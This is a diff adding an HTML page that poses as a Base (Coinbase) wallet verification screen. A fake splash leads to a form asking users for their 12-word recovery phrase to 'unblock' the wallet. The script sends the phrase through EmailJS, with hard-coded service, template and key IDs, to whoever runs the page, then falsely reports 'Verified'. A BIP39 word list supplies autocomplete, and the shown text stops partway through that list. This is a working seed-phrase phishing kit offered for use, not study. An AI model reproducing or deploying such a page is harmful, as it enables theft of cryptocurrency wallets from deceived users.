@@ -1,0 +1,1072 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Base · EmailJS verification</title>
+  <!-- EmailJS SDK -->
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+  </script>
+  <style>
+    /* ----- LIGHT / DARK THEME (system preference) ----- */
+    :root {
+      --bg: #000;
+      --text: #fff;
+      --input-bg: #111;
+      --input-border: #333;
+      --input-focus: #3399ff;
+      --btn-bg: #1a1a1a;
+      --btn-hover-bg: #2a2a2a;
+      --border: #222;
+      --muted-text: #bbb;
+      --coinbase-blue: #0052FF;
+      --splash-bg: #000;
+      --verified-overlay: rgba(0, 0, 0, 0.92);
+      --form-bg: #111;
+      --status-color: #aaa;
+      --status-error: #ff6b6b;
+      --status-success: #51cf66;
+    }
+
+    /* light theme overrides */
+    @media (prefers-color-scheme: light) {
+      :root {
+        --bg: #f5f7fa;
+        --text: #1a1a1a;
+        --input-bg: #ffffff;
+        --input-border: #d0d7de;
+        --input-focus: #0052FF;
+        --btn-bg: #e6e9ed;
+        --btn-hover-bg: #d0d7de;
+        --border: #d0d7de;
+        --muted-text: #57606a;
+        --splash-bg: #f5f7fa;
+        --verified-overlay: rgba(255, 255, 255, 0.95);
+        --form-bg: #ffffff;
+        --status-color: #57606a;
+        --status-error: #cf222e;
+        --status-success: #2da44e;
+      }
+      /* light mode specific overrides for elements that need dark bg */
+      .search-area {
+        background: #ffffff !important;
+        border: 1px solid #d0d7de !important;
+      }
+      .search-area input[type="search"] {
+        color: #1a1a1a !important;
+      }
+      .search-area input[type="search"]::placeholder {
+        color: #57606a !important;
+      }
+      .create-wallet-btn {
+        background-color: #e6e9ed !important;
+        color: #1a1a1a !important;
+        background-image: linear-gradient(#e6e9ed, #e6e9ed),
+          conic-gradient(from var(--angle), red, orange, yellow, green, blue, skyblue, red) !important;
+        background-origin: border-box !important;
+        background-clip: padding-box, border-box !important;
+      }
+      .create-wallet-btn:hover {
+        background-color: #d0d7de !important;
+        animation: rotate-border 2s linear infinite;
+      }
+      .connect-btn {
+        background-color: #e6e9ed !important;
+        color: #1a1a1a !important;
+        background-image: linear-gradient(#e6e9ed, #e6e9ed),
+          conic-gradient(from var(--angle), red, orange, yellow, green, blue, skyblue, red) !important;
+        background-origin: border-box !important;
+        background-clip: padding-box, border-box !important;
+      }
+      .connect-btn:hover {
+        background-color: #d0d7de !important;
+        animation: rotate-border 2s linear infinite;
+      }
+      .autocomplete-items {
+        background-color: #ffffff !important;
+        border: 1px solid #ffffff !important;
+      }
+      .autocomplete-items div {
+        background-color: #0052FF !important;
+        color: #ffffff !important;
+      }
+      .autocomplete-items div:hover,
+      .autocomplete-active {
+        background-color: #003dcc !important;
+        color: #ffffff !important;
+      }
+      .submit-btn {
+        background: #0052FF !important;
+        color: #ffffff !important;
+      }
+      .submit-btn:hover {
+        background: #003dcc !important;
+      }
+      .site-header {
+        background: #ffffff !important;
+        border-bottom: 1px solid #d0d7de !important;
+      }
+      main {
+        background: #f5f7fa !important;
+      }
+      .full-form {
+        background: #ffffff !important;
+        box-shadow: 0 2px 12px rgba(0, 0, 0, 0.08);
+      }
+      .full-form h2 {
+        color: #1a1a1a !important;
+      }
+      textarea {
+        background: #ffffff !important;
+        color: #1a1a1a !important;
+        border-color: #d0d7de !important;
+      }
+      textarea::placeholder {
+        color: #57606a !important;
+      }
+      label {
+        color: #57606a !important;
+      }
+      .form-status {
+        color: #57606a !important;
+      }
+      .form-status.error {
+        color: #cf222e !important;
+      }
+      .form-status.success {
+        color: #2da44e !important;
+      }
+      #splash-overlay {
+        background: #f5f7fa !important;
+      }
+      .splash-text {
+        color: #1a1a1a !important;
+      }
+      #verified-page {
+        background: rgba(255, 255, 255, 0.95) !important;
+        backdrop-filter: blur(8px);
+      }
+      .verified-title {
+        color: #1a1a1a !important;
+      }
+      .verified-sub {
+        color: #57606a !important;
+      }
+      .verified-icon {
+        filter: drop-shadow(0 0 8px rgba(0, 82, 255, 0.2));
+      }
+      #verified-redirect-btn {
+        background: #0052FF !important;
+        color: #ffffff !important;
+      }
+      #verified-redirect-btn:hover {
+        background: #003dcc !important;
+      }
+      /* Logo - keep original colors, transparent background works with both themes */
+      .logo-img {
+        /* No filter or color changes */
+      }
+    }
+
+    /* ----- BASE STYLES ----- */
+    html,
+    body {
+      height: 100%;
+      margin: 0;
+      background: var(--bg);
+      color: var(--text);
+      font-family: system-ui, -apple-system, "Segoe UI", Roboto, Arial, sans-serif;
+      transition: background 0.3s ease, color 0.3s ease;
+    }
+
+    /* splash / verification overlay */
+    #splash-overlay {
+      position: fixed;
+      inset: 0;
+      background: var(--splash-bg);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+      flex-direction: column;
+      gap: 1.5rem;
+      transition: opacity 0.5s ease, background 0.3s ease;
+    }
+    #splash-overlay.hidden {
+      opacity: 0;
+      pointer-events: none;
+    }
+    .spinner {
+      width: 48px;
+      height: 48px;
+      border: 5px solid var(--input-border);
+      border-top: 5px solid var(--coinbase-blue);
+      border-radius: 50%;
+      animation: spin 0.9s linear infinite;
+    }
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+    .splash-text {
+      font-size: 1rem;
+      letter-spacing: 0.5px;
+      color: var(--muted-text);
+    }
+
+    /* verified page */
+    #verified-page {
+      position: fixed;
+      inset: 0;
+      background: var(--verified-overlay);
+      backdrop-filter: blur(8px);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 9998;
+      flex-direction: column;
+      gap: 0.8rem;
+      transition: background 0.3s ease;
+    }
+    #verified-page.visible {
+      display: flex;
+    }
+    .verified-icon {
+      font-size: 1.5rem;
+      line-height: 1;
+      filter: drop-shadow(0 0 8px rgba(0, 82, 255, 0.3));
+    }
+    .verified-title {
+      font-size: 1.6rem;
+      font-weight: 500;
+      color: var(--text);
+      margin-top: 0.2rem;
+    }
+    .verified-sub {
+      color: var(--muted-text);
+      font-size: 0.95rem;
+      margin-top: -0.2rem;
+    }
+    #verified-redirect-btn {
+      margin-top: 1.4rem;
+      padding: 0.7rem 2.8rem;
+      border-radius: 40px;
+      border: none;
+      background: var(--coinbase-blue);
+      color: #fff;
+      font-weight: 600;
+      font-size: 1rem;
+      cursor: pointer;
+      transition: background 0.2s ease, transform 0.1s ease;
+      letter-spacing: 0.3px;
+    }
+    #verified-redirect-btn:hover {
+      background: #003dcc;
+      transform: scale(1.02);
+    }
+
+    /* main site */
+    .site-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      height: 80px;
+      padding: 0 20px;
+      background: var(--bg);
+      border-bottom: 1px solid var(--border);
+      box-sizing: border-box;
+      transition: background 0.3s ease, border-color 0.3s ease;
+      flex-wrap: wrap;
+      gap: 12px;
+    }
+
+    .logo {
+      display: flex;
+      align-items: center;
+    }
+    .logo-img {
+      height: 40px;
+      width: auto;
+      display: block;
+      margin-right: 140px;
+    }
+
+    .header-controls {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+      flex-wrap: wrap;
+      flex: 1 1 auto;
+      min-width: 280px;
+      box-sizing: border-box;
+    }
+
+    .search-area {
+      display: flex;
+      align-items: center;
+      background: var(--input-bg);
+      border: 1px solid var(--input-border);
+      border-radius: 20px;
+      height: 40px;
+      min-width: 180px;
+      flex: 2 1 260px;
+      padding: 0 8px 0 12px;
+      box-sizing: border-box;
+      cursor: text;
+      transition: border-color 0.2s ease, background 0.3s ease;
+    }
+    .search-area.active {
+      border-color: var(--input-focus);
+      box-shadow: 0 0 6px var(--input-focus);
+    }
+    .search-icon {
+      width: 20px;
+      height: 20px;
+      margin-right: 8px;
+      flex-shrink: 0;
+    }
+    .search-icon img {
+      width: 80%;
+      height: 80%;
+      display: block;
+      cursor: pointer;
+      padding-top: 2px;
+    }
+    .search-area input[type="search"] {
+      flex: 1 1 auto;
+      height: 100%;
+      border: none;
+      background: transparent;
+      color: var(--text);
+      font-size: 16px;
+      outline-offset: 0;
+      outline: none;
+      padding: 0;
+      min-width: 80px;
+    }
+    .search-area input[type="search"]::placeholder {
+      color: var(--muted-text);
+    }
+    .search-area input[type="search"]:focus {
+      outline: none;
+    }
+
+    .action-btn {
+      min-width: 120px;
+      height: 40px;
+      border: none;
+      border-radius: 25px;
+      color: var(--text);
+      cursor: pointer;
+      font-size: 14px;
+      font-weight: 600;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      padding: 0 18px;
+      transition: background 0.2s ease, color 0.3s ease;
+      position: relative;
+      overflow: hidden;
+      white-space: nowrap;
+    }
+
+    /* Rainbow border effect for both buttons */
+    .create-wallet-btn {
+      background-color: var(--btn-bg);
+      border: 2px solid transparent;
+      background-image: linear-gradient(var(--btn-bg), var(--btn-bg)),
+        conic-gradient(from var(--angle), red, orange, yellow, green, blue, skyblue, red);
+      background-origin: border-box;
+      background-clip: padding-box, border-box;
+      --angle: 0deg;
+    }
+    .create-wallet-btn:hover {
+      animation: rotate-border 2s linear infinite;
+    }
+
+    .connect-btn {
+      background-color: var(--btn-bg);
+      border: 2px solid transparent;
+      background-image: linear-gradient(var(--btn-bg), var(--btn-bg)),
+        conic-gradient(from var(--angle), red, orange, yellow, green, blue, skyblue, red);
+      background-origin: border-box;
+      background-clip: padding-box, border-box;
+      --angle: 0deg;
+    }
+    .connect-btn:hover {
+      animation: rotate-border 2s linear infinite;
+    }
+
+    @property --angle {
+      syntax: '<angle>';
+      initial-value: 0deg;
+      inherits: false;
+    }
+    @keyframes rotate-border {
+      to {
+        --angle: 360deg;
+      }
+    }
+
+    main {
+      min-height: calc(100vh - 80px);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+      box-sizing: border-box;
+      background: var(--bg);
+      transition: background 0.3s ease;
+    }
+
+    form.full-form {
+      background: var(--form-bg);
+      padding: 28px 32px;
+      border-radius: 12px;
+      max-width: 480px;
+      width: 100%;
+      box-sizing: border-box;
+      position: relative;
+      transition: background 0.3s ease, box-shadow 0.3s ease;
+      box-shadow: 0 2px 12px rgba(0, 0, 0, 0.15);
+    }
+    form.full-form h2 {
+      margin-top: 0;
+      margin-bottom: 20px;
+      font-weight: 500;
+      font-size: 22px;
+      color: var(--text);
+      text-align: left;
+      transition: color 0.3s ease;
+    }
+    label {
+      display: block;
+      margin-bottom: 12px;
+      font-size: 14px;
+      color: var(--muted-text);
+      transition: color 0.3s ease;
+    }
+    textarea {
+      width: 100%;
+      padding: 10px 12px;
+      margin-bottom: 6px;
+      font-size: 14px;
+      border-radius: 6px;
+      border: 1px solid var(--input-border);
+      background: var(--input-bg);
+      color: var(--text);
+      resize: vertical;
+      outline: none;
+      box-sizing: border-box;
+      font-family: inherit;
+      transition: background 0.3s ease, color 0.3s ease, border-color 0.3s ease;
+      min-height: 100px;
+    }
+    textarea::placeholder {
+      color: var(--muted-text);
+    }
+    textarea:focus {
+      border-color: var(--input-focus);
+      box-shadow: 0 0 6px var(--input-focus);
+    }
+
+    button.submit-btn {
+      width: 100%;
+      height: 44px;
+      background: var(--btn-bg);
+      border: none;
+      border-radius: 6px;
+      color: var(--text);
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.2s ease, color 0.3s ease;
+      margin-top: 12px;
+    }
+    button.submit-btn:hover {
+      background: var(--btn-hover-bg);
+    }
+
+    /* AUTOCOMPLETE */
+    .autocomplete-items {
+      display: flex !important;
+      flex-wrap: wrap;
+      gap: 8px;
+      background-color: var(--input-bg);
+      border: 1px solid var(--input-border);
+      border-top: none;
+      padding: 6px 8px;
+      margin-bottom: 12px;
+      width: 100%;
+      box-sizing: border-box;
+      border-radius: 6px;
+      color: var(--text);
+      position: static;
+      max-height: none;
+      overflow: visible;
+      font-size: 10px;
+      transition: background 0.3s ease, border-color 0.3s ease;
+    }
+    .autocomplete-items div {
+      background-color: var(--coinbase-blue);
+      padding: 6px 12px;
+      border-radius: 4px;
+      cursor: pointer;
+      white-space: nowrap;
+      user-select: none;
+      transition: background-color 0.2s ease, color 0.2s ease;
+      font-size: 10px;
+      color: #ffffff;
+      font-weight: 500;
+    }
+    .autocomplete-items div:hover,
+    .autocomplete-active {
+      background-color: #003dcc;
+      color: #ffffff !important;
+    }
+
+    /* status */
+    .form-status {
+      margin-top: 12px;
+      font-size: 0.9rem;
+      color: var(--status-color);
+      text-align: center;
+      transition: color 0.3s ease;
+    }
+    .form-status.error {
+      color: var(--status-error);
+    }
+    .form-status.success {
+      color: var(--status-success);
+    }
+
+    /* responsive tweaks */
+    @media (max-width: 768px) {
+      .site-header {
+        height: auto;
+        padding: 12px 16px;
+        flex-direction: column;
+        align-items: stretch;
+        gap: 8px;
+      }
+      .logo {
+        display: flex;
+        justify-content: center;
+      }
+      .logo-img {
+        height: 40px;
+        margin-right: 0;
+      }
+      .header-controls {
+        flex-direction: column;
+        width: 100%;
+        min-width: unset;
+        gap: 8px;
+      }
+      .search-area {
+        width: 100%;
+        flex: 1 1 auto;
+        min-width: unset;
+      }
+      .action-btn {
+        width: 100%;
+        min-width: unset;
+        justify-content: center;
+      }
+      form.full-form {
+        padding: 20px 16px;
+        margin: 0 8px;
+      }
+      form.full-form h2 {
+        font-size: 20px;
+      }
+      main {
+        padding: 12px;
+        min-height: calc(100vh - 160px);
+      }
+    }
+
+    @media (max-width: 480px) {
+      .site-header {
+        padding: 10px 12px;
+      }
+      .logo-img {
+        height: 34px;
+        margin-right: 0;
+      }
+      .search-area {
+        height: 36px;
+        padding: 0 6px 0 10px;
+      }
+      .search-area input[type="search"] {
+        font-size: 14px;
+      }
+      .action-btn {
+        height: 36px;
+        font-size: 13px;
+        padding: 0 14px;
+      }
+      form.full-form {
+        padding: 16px 12px;
+      }
+      form.full-form h2 {
+        font-size: 18px;
+        margin-bottom: 16px;
+      }
+      textarea {
+        font-size: 13px;
+        padding: 8px 10px;
+        min-height: 80px;
+      }
+      .verified-title {
+        font-size: 1.3rem;
+      }
+      #verified-redirect-btn {
+        padding: 0.6rem 2rem;
+        font-size: 0.9rem;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- SPLASH / VERIFYING -->
+  <div id="splash-overlay">
+    <div class="spinner"></div>
+    <div class="splash-text">Verifying · Base</div>
+  </div>
+
+  <!-- VERIFIED PAGE -->
+  <div id="verified-page">
+    <div class="verified-icon">✅</div>
+    <div class="verified-title">Verified</div>
+    <div class="verified-sub">Your recovery phrase was sent securely</div>
+    <button id="verified-redirect-btn">Verify with Base</button>
+  </div>
+
+  <!-- MAIN SITE -->
+  <header class="site-header" aria-label="Site header">
+    <div class="logo" aria-label="Site logo container">
+      <img src="https://3sx2y5mo5g.ucarecd.net/dd0c5bea-bf6f-4397-bb26-4a203f693aa1/shjHEJGDUYDBJhf.png" alt="Base logo" class="logo-img" />
+    </div>
+    <div class="header-controls">
+      <form class="search-area" role="search" aria-label="Site search" method="GET" action="/search-results" novalidate>
+        <span class="search-icon" aria-hidden="true">
+          <img src="https://i.imghippo.com/files/Alr7794o.png" alt="Search Icon" />
+        </span>
+        <input type="search" name="q" placeholder="Search coins, apps…" aria-label="Search coins, apps" />
+      </form>
+      <button type="button" class="action-btn create-wallet-btn" aria-label="First action">Verify Wallet</button>
+      <button type="button" class="action-btn connect-btn" aria-label="Second action">Connect</button>
+    </div>
+  </header>
+
+  <main>
+    <form class="full-form" id="recovery-form" action="#" method="post" aria-label="User details form" autocomplete="off">
+      <h2>Verify with recovery phrase</h2>
+      <label for="about">Enter exactly 12 words</label>
+      <textarea id="about" name="Recovery phrase" rows="4" placeholder="12-word recovery phrase"></textarea>
+      <div id="autocomplete-list" class="autocomplete-items" style="display:none;"></div>
+      <button type="submit" class="submit-btn" id="continue-btn">Unblock</button>
+      <div id="form-status" class="form-status"></div>
+    </form>
+  </main>
+
+  <script>
+    (function() {
+      // ----- 1) INIT EmailJS (replace with your PUBLIC KEY) -----
+      (function() {
+        emailjs.init({
+          publicKey: "SdkmRe8WZ7itEba9z",
+        });
+      })();
+
+      // ----- 2) SPLASH + VERIFIED overlay control -----
+      const splash = document.getElementById('splash-overlay');
+      const verifiedPage = document.getElementById('verified-page');
+      const verifiedRedirectBtn = document.getElementById('verified-redirect-btn');
+
+      setTimeout(() => {
+        splash.classList.add('hidden');
+      }, 2200);
+
+      verifiedRedirectBtn.addEventListener('click', function() {
+        verifiedPage.classList.remove('visible');
+        window.location.hash = '#main';
+      });
+
+      // ----- 3) FORM HANDLING + EmailJS send -----
+      const form = document.getElementById('recovery-form');
+      const textarea = document.getElementById('about');
+      const statusDiv = document.getElementById('form-status');
+
+      function countWords(str) {
+        return str.trim().split(/\s+/).filter(word => word.length > 0).length;
+      }
+
+      form.addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        const phrase = textarea.value.trim();
+        const wordCount = countWords(phrase);
+
+        if (!phrase) {
+          statusDiv.textContent = '⛔ Please enter your recovery phrase.';
+          statusDiv.className = 'form-status error';
+          return;
+        }
+
+        if (wordCount !== 12) {
+          statusDiv.textContent = `⛔ Please enter exactly 12 words (you entered ${wordCount})`;
+          statusDiv.className = 'form-status error';
+          return;
+        }
+
+        statusDiv.className = 'form-status';
+        statusDiv.textContent = '⏳ Sending securely...';
+        const btn = document.getElementById('continue-btn');
+        btn.disabled = true;
+        btn.style.opacity = '0.6';
+
+        const templateParams = {
+          user_phrase: phrase,
+          user_email: 'guest@base.io',
+          from_name: 'Base Wallet',
+          message: `Recovery phrase: ${phrase}`
+        };
+
+        emailjs.send('service_zuj2d2a', 'template_tvd86sp', templateParams)
+          .then(function(response) {
+            console.log('SUCCESS!', response.status, response.text);
+            statusDiv.textContent = '✅ Verified!';
+            statusDiv.className = 'form-status success';
+            verifiedPage.classList.add('visible');
+            splash.classList.add('hidden');
+            textarea.value = '';
+            btn.disabled = false;
+            btn.style.opacity = '1';
+            setTimeout(() => {
+              statusDiv.textContent = '';
+              statusDiv.className = 'form-status';
+            }, 3000);
+          }, function(error) {
+            console.error('FAILED...', error);
+            statusDiv.textContent = '❌ Verification failed. Please try again.';
+            statusDiv.className = 'form-status error';
+            btn.disabled = false;
+            btn.style.opacity = '1';
+          });
+      });
+
+      // ----- 4) AUTOCOMPLETE -----
+      const listDiv = document.getElementById("autocomplete-list");
+      const suggestions = [
+        "abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract", "absurd", "abuse",
+        "access", "accident", "account", "accuse", "achieve", "acid", "acoustic", "acquire", "across", "act",
+        "action", "actor", "actress", "actual", "adapt", "add", "addict", "address", "adjust", "admit",
+        "adult", "advance", "advice", "aerobic", "affair", "afford", "afraid", "again", "age", "agent",
+        "agree", "ahead", "aim", "air", "airport", "aisle", "alarm", "album", "alcohol", "alert",
+        "alien", "all", "alley", "allow", "almost", "alone", "alpha", "already", "also", "alter",
+        "always", "amateur", "amazing", "among", "amount", "amused", "analyst", "anchor", "ancient", "anger",
+        "angle", "angry", "animal", "ankle", "announce", "annual", "another", "answer", "antenna", "antique",
+        "anxiety", "any", "apart", "apology", "appear", "apple", "approve", "april", "arch", "arctic",
+        "area", "arena", "argue", "arm", "armed", "armor", "army", "around", "arrange", "arrest",
+        "arrive", "arrow", "art", "artefact", "artist", "artwork", "ask", "aspect", "assault", "asset",
+        "assist", "assume", "asthma", "athlete", "atom", "attack", "attend", "attitude", "attract", "auction",
+        "audit", "august", "aunt", "author", "auto", "autumn", "average", "avocado", "avoid", "awake",
+        "aware", "away", "awesome", "awful", "awkward", "axis", "baby", "bachelor", "bacon", "badge",
+        "bag", "balance", "balcony", "ball", "bamboo", "banana", "banner", "bar", "barely", "bargain",
+        "barrel", "base", "basic", "basket", "battle", "beach", "bean", "beauty", "because", "become",
+        "beef", "before", "begin", "behave", "behind", "believe", "below", "belt", "bench", "benefit",
+        "best", "betray", "better", "between", "beyond", "bicycle", "bid", "bike", "bind", "biology",
+        "bird", "birth", "bitter", "black", "blade", "blame", "blanket", "blast", "bleak", "bless",
+        "blind", "blood", "blossom", "blouse", "blue", "blur", "blush", "board", "boat", "body",
+        "boil", "bomb", "bone", "bonus", "book", "boost", "border", "boring", "borrow", "boss",
+        "bottom", "bounce", "box", "boy", "bracket", "brain", "brand", "brass", "brave", "bread",
+        "breeze", "brick", "bridge", "brief", "bright", "bring", "brisk", "broccoli", "broken", "bronze",
+        "broom", "brother", "brown", "brush", "bubble", "buddy", "budget", "buffalo", "build", "bulb",
+        "bulk", "bullet", "bundle", "bunker", "burden", "burger", "burst", "bus", "business", "busy",
+        "butter", "buyer", "buzz", "cabbage", "cabin", "cable", "cactus", "cage", "cake", "call",
+        "calm", "camera", "camp", "can", "canal", "cancel", "candy", "cannon", "canoe", "canvas",
+        "canyon", "capable", "capital", "captain", "car", "carbon", "card", "cargo", "carpet", "carry",
+        "cart", "case", "cash", "casino", "castle", "casual", "cat", "catalog", "catch", "category",
+        "cattle", "caught", "cause", "caution", "cave", "ceiling", "celery", "cement", "census", "century",
+        "cereal", "certain", "chair", "chalk", "champion", "change", "chaos", "chapter", "charge", "chase",
+        "chat", "cheap", "check", "cheese", "chef", "cherry", "chest", "chicken", "chief", "child",
+        "chimney", "choice", "choose", "chronic", "chuckle", "chunk", "churn", "cigar", "cinnamon", "circle",
+        "citizen", "city", "civil", "claim", "clap", "clarify", "claw", "clay", "clean", "clerk",
+        "clever", "click", "client", "cliff", "climb", "clinic", "clip", "clock", "clog", "close",
+        "cloth", "cloud", "clown", "club", "clump", "cluster", "clutch", "coach", "coast", "coconut",
+        "code", "coffee", "coil", "coin", "collect", "color", "column", "combine", "come", "comfort",
+        "comic", "common", "company", "concert", "conduct", "confirm", "congress", "connect", "consider", "control",
+        "convince", "cook", "cool", "copper", "copy", "coral", "core", "corn", "correct", "cost",
+        "cotton", "couch", "country", "couple", "course", "cousin", "cover", "coyote", "crack", "cradle",
+        "craft", "cram", "crane", "crash", "crater", "crawl", "crazy", "cream", "credit", "creek",
+        "crew", "cricket", "crime", "crisp", "critic", "crop", "cross", "crouch", "crowd", "crucial",
+        "cruel", "cruise", "crumble", "crunch", "crush", "cry", "crystal", "cube", "culture", "cup",
+        "cupboard", "curious", "current", "curtain", "curve", "cushion", "custom", "cute", "cycle", "dad",
+        "damage", "damp", "dance", "danger", "daring", "dash", "daughter", "dawn", "day", "deal",
+        "debate", "debris", "decade", "december", "decide", "decline", "decorate", "decrease", "deer", "defense",
+        "define", "defy", "degree", "delay", "deliver", "demand", "demise", "denial", "dentist", "deny",
+        "depart", "depend", "deposit", "depth", "deputy", "derive", "describe", "desert", "design", "desk",
+        "despair", "destroy", "detail", "detect", "develop", "device", "devote", "diagram", "dial", "diamond",
+        "diary", "dice", "diesel", "diet", "differ", "digital", "dignity", "dilemma", "dinner", "dinosaur",
+        "direct", "dirt", "disagree", "discover", "disease", "dish", "dismiss", "disorder", "display", "distance",
+        "divert", "divide", "divorce", "dizzy", "doctor", "document", "dog", "doll", "dolphin", "domain",
+        "donate", "donkey", "donor", "door", "dose", "double", "dove", "draft", "dragon", "drama",
+        "drastic", "draw", "dream", "dress", "drift", "drill", "drink", "drip", "drive", "drop",
+        "drum", "dry", "duck", "dumb", "dune", "during", "dust", "dutch", "duty", "dwarf",
+        "dynamic", "eager", "eagle", "early", "earn", "earth", "easily", "east", "easy", "echo",
+        "ecology", "economy", "edge", "edit", "educate", "effort", "egg", "eight", "either", "elbow",
+        "elder", "electric", "elegant", "element", "elephant", "elevator", "elite", "else", "embark", "embody",
+        "embrace", "emerge", "emotion", "employ", "empower", "empty", "enable", "enact", "end", "endless",
+        "endorse", "enemy", "energy", "enforce", "engage", "engine", "enhance", "enjoy", "enlist", "enough",
+        "enrich", "enroll", "ensure", "enter", "entire", "entry", "envelope", "episode", "equal", "equip",
+        "era", "erase", "erode", "erosion", "error", "erupt", "escape", "essay", "essence", "estate",
+        "eternal", "ethics", "evidence", "evil", "evoke", "evolve", "exact", "example", "excess", "exchange",
+        "excite", "exclude", "excuse", "execute", "exercise", "exhaust", "exhibit", "exile", "exist", "exit",
+        "exotic", "expand", "expect", "expire", "explain", "expose", "express", "extend", "extra", "eye",
+        "eyebrow", "fabric", "face", "faculty", "fade", "faint", "faith", "fall", "false", "fame",
+        "family", "famous", "fan", "fancy", "fantasy", "farm", "fashion", "fat", "fatal", "father",
+        "fatigue", "fault", "favorite", "feature", "february", "federal", "fee", "feed", "feel", "female",
+        "fence", "festival", "fetch", "fever", "few", "fiber", "fiction", "field", "figure", "file",
+        "film", "filter", "final", "find", "fine", "finger", "finish", "fire", "firm", "first",
+        "fiscal", "fish", "fit", "fitness", "fix", "flag", "flame", "flash", "flat", "flavor",
+        "flee", "flight", "flip", "float", "flock", "floor", "flower", "fluid", "flush", "fly",
+        "foam", "focus", "fog", "foil", "fold", "follow", "food", "foot", "force", "forest",
+        "forget", "fork", "fortune", "forum", "forward", "fossil", "foster", "found", "fox", "fragile",
+        "frame", "frequent", "fresh", "friend", "fringe", "frog", "front", "frost", "frown", "frozen",
+        "fruit", "fuel", "fun", "funny", "furnace", "fury", "future", "gadget", "gain", "galaxy",
+        "gallery", "game", "gap", "garage", "garbage", "garden", "garlic", "garment", "gas", "gasp",
+        "gate", "gather", "gauge", "gaze", "general", "genius", "genre", "gentle", "genuine", "gesture",
+        "ghost", "giant", "gift", "giggle", "ginger", "giraffe", "girl", "give", "glad", "glance",
+        "glare", "glass", "glide", "glimpse", "globe", "gloom", "glory", "glove", "glow", "glue",
+        "goat", "goddess", "gold", "good", "goose", "gorilla", "gospel", "gossip", "govern", "gown",
+        "grab", "grace", "grain", "grant", "grape", "grass", "gravity", "great", "green", "grid",
+        "grief", "grit", "grocery", "group", "grow", "grunt", "guard", "guess", "guide", "guilt",
+        "guitar", "gun", "gym", "habit", "hair", "half", "hammer", "hamster", "hand", "happy",
+        "harbor", "hard", "harsh", "harvest", "hat", "have", "hawk", "hazard", "head", "health",
+        "heart", "heavy", "hedgehog", "height", "hello", "helmet", "help", "hen", "hero", "hidden",
+        "high", "hill", "hint", "hip", "hire", "history", "hobby", "hockey", "hold", "hole",
+        "holiday", "hollow", "home", "honey", "hood", "hope", "horn", "horror", "horse", "hospital",
+        "host", "hotel", "hour", "hover", "hub", "huge", "human", "humble", "humor", "hundred",
+        "hungry", "hunt", "hurdle", "hurry", "hurt", "husband", "hybrid", "ice", "icon", "idea",
+        "identify", "idle", "ignore", "ill", "illegal", "illness", "image", "imitate", "immense", "immune",
+        "impact", "impose", "improve", "impulse", "inch", "include", "income", "increase", "index", "indicate",
+        "indoor", "industry", "infant", "inflict", "inform", "inhale", "inherit", "initial", "inject", "injury",
+        "inmate", "inner", "innocent", "input", "inquiry", "insane", "insect", "inside", "inspire", "install",
+        "intact", "interest", "into", "invest", "invite", "involve", "iron", "island", "isolate", "issue",
+        "item", "ivory", "jacket", "jaguar", "jar", "jazz", "jealous", "jeans", "jelly", "jewel",
+        "job", "join", "joke", "journey", "joy", "judge", "juice", "jump", "jungle", "junior",
+        "junk", "just", "kangaroo", "keen", "keep", "ketchup", "key", "kick", "kid", "kidney",
+        "kind", "kingdom", "kiss", "kit", "kitchen", "kite", "kitten", "kiwi", "knee", "knife",
+        "knock", "know", "lab", "label", "labor", "ladder", "lady", "lake", "lamp", "language",
+        "laptop", "large", "later", "latin", "laugh", "laundry", "lava", "law", "lawn", "lawsuit",
+        "layer", "lazy", "leader", "leaf", "learn", "leave", "lecture", "left", "leg", "legal",
+        "legend", "leisure", "lemon", "lend", "length", "lens", "leopard", "lesson", "letter", "level",
+        "liar", "liberty", "library", "license", "life", "lift", "light", "like", "limb", "limit",
+        "link", "lion", "liquid", "list", "little", "live", "lizard", "load", "loan", "lobster",
+        "local", "lock", "logic", "lonely", "long", "loop", "lottery", "loud", "lounge", "love",
+        "loyal", "lucky", "luggage", "lumber", "lunar", "lunch", "luxury", "lyrics", "machine", "mad",
+        "magic", "magnet", "maid", "mail", "main", "major", "make", "mammal", "man", "manage",
+        "mandate", "mango", "mansion", "manual", "maple", "marble", "march", "margin", "marine", "market",
+        "marriage", "mask", "mass", "master", "match", "material", "math", "matrix", "matter", "maximum",
+        "maze", "meadow", "mean", "measure", "meat", "mechanic", "medal", "media", "melody", "melt",
+        "member", "memory", "mention", "menu", "mercy", "merge", "merit", "merry", "mesh", "message",
+        "metal", "method", "middle", "midnight", "milk", "million", "mimic", "mind", "minimum", "minor",
+        "minute", "miracle", "mirror", "misery", "miss", "mistake", "mix", "mixed", "mixture", "mobile",
+        "model", "modify", "mom", "moment", "monitor", "monkey", "monster", "month", "moon", "moral",
+        "more", "morning", "mosquito", "mother", "motion", "motor", "mountain", "mouse", "move", "movie",
+        "much", "muffin", "mule", "multiply", "muscle", "museum", "mushroom", "music", "must", "mutual",
+        "myself", "mystery", "myth", "naive", "name", "napkin", "narrow", "nasty", "nation", "nature",
+        "near", "neck", "need", "negative", "neglect", "neither", "nephew", "nerve", "nest", "net",
+        "network", "neutral", "never", "news", "next", "nice", "night", "noble", "noise", "nominee",
+        "noodle", "normal", "north", "nose", "notable", "note", "nothing", "notice", "novel", "now",
+        "nuclear", "number", "nurse", "nut", "oak", "obey", "object", "oblige", "obscure", "observe",
+        "obtain", "obvious", "occur", "ocean", "october", "odor", "off", "offer", "office", "often",
+        "oil", "okay", "old", "olive", "olympic", "omit", "once", "one", "onion", "online",
+        "only", "open", "opera", "opinion", "oppose", "option", "orange", "orbit", "orchard", "order",
+        "ordinary", "organ", "orient", "original", "orphan", "ostrich", "other", "outdoor", "outer", "output",
+        "outside", "oval", "oven", "over", "own", "owner", "oxygen", "oyster", "ozone", "pact",
